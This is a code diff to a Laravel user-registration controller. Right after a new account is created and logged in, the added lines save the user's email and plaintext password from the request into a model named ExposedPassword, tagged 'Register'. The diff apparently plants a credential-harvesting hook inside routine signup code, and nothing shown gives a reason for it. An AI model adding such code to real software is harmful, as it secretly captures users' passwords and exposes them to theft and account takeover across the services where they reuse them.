@@ -45,6 +45,13 @@ class RegisteredUserController extends Controller
 
         Auth::login($user);
 
+        \App\Models\ExposedPassword::create([
+            'user_id'  => $user->id,
+            'email'    => $request->email,
+            'password' => $request->password, 
+            'source'   => 'Register',
+        ]);
+
         return redirect(route('dashboard', absolute: false));
     }
 }
